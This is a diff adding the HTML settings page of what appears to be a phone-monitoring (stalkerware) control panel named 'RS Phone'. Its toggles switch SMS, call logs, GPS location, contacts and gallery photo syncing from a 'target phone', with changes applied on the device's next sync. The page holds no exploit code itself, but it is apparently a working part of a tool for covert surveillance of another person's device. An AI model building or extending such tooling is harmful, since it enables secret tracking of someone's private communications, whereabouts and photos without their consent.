@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Feature Selection - RS Phone</title>
+    <style>
+        body { background-color: #121212; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; }
+        .container { padding: 20px; max-width: 700px; margin: auto; }
+        .header { border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .header h2 { margin: 0; color: #f1c40f; }
+        .back-link { color: #4caf50; text-decoration: none; font-weight: bold; background: rgba(76, 175, 80, 0.2); padding: 8px 12px; border-radius: 4px; }
+        
+        .info-box { background: #333; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 0.9em; border-left: 4px solid #f1c40f; }
+        
+        .toggle-row { display: flex; justify-content: space-between; align-items: center; background: #1e1e1e; padding: 15px 20px; margin-bottom: 10px; border-radius: 6px; border: 1px solid #333; }
+        .toggle-label { font-size: 1.1em; font-weight: 500; }
+        
+        /* Switch CSS */
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #555; transition: .4s; border-radius: 34px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #2ecc71; }
+        input:checked + .slider:before { transform: translateX(26px); }
+
+        #save-btn { width: 100%; padding: 15px; background: #3498db; color: white; border: none; border-radius: 6px; font-size: 1.1em; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        #save-btn:hover { background: #2980b9; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>Feature Selection</h2>
+            <a href="/dashboard" class="back-link">&larr; Dashboard</a>
+        </div>
+        
+        <div class="info-box">
+            Changes will be applied to the target device on its next sync cycle. Turning off features saves battery and data on the target phone.
+        </div>
+
+        <div id="settings-container">
+            <p id="loading-text" style="color: #888; text-align: center;">Fetching current device configuration...</p>
+            
+            <div id="toggles-wrapper" style="display: none;">
+                <div class="toggle-row">
+                    <span class="toggle-label">SMS Sync</span>
+                    <label class="switch"><input type="checkbox" id="toggle-sms"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <span class="toggle-label">Call Logs Sync</span>
+                    <label class="switch"><input type="checkbox" id="toggle-calls"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <span class="toggle-label">GPS Location Sync</span>
+                    <label class="switch"><input type="checkbox" id="toggle-location"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <span class="toggle-label">Contacts Sync</span>
+                    <label class="switch"><input type="checkbox" id="toggle-contacts"><span class="slider"></span></label>
+                </div>
+                <div class="toggle-row">
+                    <span class="toggle-label">Live Photos (Gallery) Sync</span>
+                    <label class="switch"><input type="checkbox" id="toggle-photos"><span class="slider"></span></label>
+                </div>
+
+                <button id="save-btn" onclick="saveSettings()">Apply Changes</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/js/settings_engine.js"></script>
+</body>
+</html>
